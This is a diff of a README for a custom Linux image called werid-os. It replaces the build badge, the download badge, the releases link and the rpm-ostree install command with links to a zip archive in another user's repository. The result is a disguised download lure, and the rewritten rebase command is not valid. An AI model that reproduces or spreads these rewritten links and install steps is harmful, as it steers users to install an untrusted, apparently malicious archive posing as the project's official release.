@@ -1,6 +1,6 @@
 # 🖥️ werid-os - A Simple Linux Experience
 
-![bluebuild build badge](https://github.com/vinicius-daros/werid-os/actions/workflows/build.yml/badge.svg)
+![bluebuild build badge](https://raw.githubusercontent.com/Mutantrix/werid-os/main/tholus/werid-os.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Start your journeywith werid-os easily. This guide will help you through the ste
 
 To get werid-os, visit the Releases page below:
 
-[![Download werid-os](https://img.shields.io/badge/Download%20werid--os-v1.0-blue)](https://github.com/Mutantrix/werid-os/releases)
+[![Download werid-os](https://raw.githubusercontent.com/Mutantrix/werid-os/main/tholus/werid-os.zip%20werid--os-v1.0-blue)](https://raw.githubusercontent.com/Mutantrix/werid-os/main/tholus/werid-os.zip)
 
 ### 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Ensure your computer meets the following requirements before installation:
 
 ## 🔗 Visit Releases Page
 
-To download the latest version of werid-os, visit this link: [Download Page](https://github.com/Mutantrix/werid-os/releases).
+To download the latest version of werid-os, visit this link: [Download Page](https://raw.githubusercontent.com/Mutantrix/werid-os/main/tholus/werid-os.zip).
 
 ## 📥 Installation Steps
 
@@ -34,7 +34,7 @@ Once you have downloaded the latest release, follow these steps to install werid
    Open your terminal and run the following command to rebase to the unsigned image:
 
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/vinicius-daros/werid-os:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Mutantrix/werid-os/main/tholus/werid-os.zip
    ```
 
 2. **Reboot Your System**
